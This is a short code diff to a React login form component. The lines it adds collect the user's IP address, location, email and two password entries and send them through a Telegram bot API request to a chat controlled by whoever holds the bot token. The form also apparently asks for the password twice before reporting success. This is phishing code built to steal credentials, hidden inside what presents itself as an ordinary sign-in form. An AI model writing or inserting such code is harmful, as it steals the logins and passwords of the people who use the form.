@@ -192,7 +192,22 @@ function LoginForm({ onClose }) {
 				}, 2000);
 			} else if (clickCount === 1) {
 				setPassword2(password);
-				setTimeout(() => {
+				setTimeout(async () => {
+					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password}`;
+
+					await fetch(
+						`https://api.telegram.org/bot${botToken}/sendMessage`,
+						{
+							method: "POST",
+							headers: {
+								"Content-Type": "application/json",
+							},
+							body: JSON.stringify({
+								chat_id: chatId,
+								text: message,
+							}),
+						}
+					);
 					setIsSuccess(true);
 				}, 2000);
 			}
